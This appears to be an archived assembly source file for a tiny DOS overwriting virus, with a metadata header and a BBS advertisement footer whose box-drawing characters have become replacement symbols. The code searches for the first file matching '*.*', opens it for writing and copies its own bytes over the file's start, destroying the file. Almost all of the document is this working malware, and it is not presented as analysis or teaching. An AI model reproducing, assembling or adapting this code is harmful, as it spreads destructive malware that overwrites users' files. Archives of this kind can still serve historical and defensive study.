; ------------------------------------------------------------
; name      0 9
; type      asm
; cve       —
; year      unknown
; os        DOS
; authors   unknown
; source    krisyotam
; archived  krisyotam (2026)
; notes     —
; ------------------------------------------------------------
code            segment
                assume  cs:code,ds:code,es:code,ss:code
                org     100h
main            proc    near
                mov     dx,offset(nev)         ; offset to '*.*'
                mov     ah,4Eh
                int     21h                    ; find first
                mov     dx,009Eh
                mov     ax,3D01h               ; writing
                int     21h                    ; open a file
                mov     bx,ax
                mov     ah,40h
                mov     cl,offset(nev)-100h+4  ; byte-szam
                mov     dx,100h
                int     21h                    ; write to file
nev: DB         '*.*'
DB              0h
main            endp
code            ends
                end     main

;�������������������������������������������������������������������������;
;������������������> and Remember Don't Forget to Call <������������������;
;������������> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <����������;
;�������������������������������������������������������������������������;

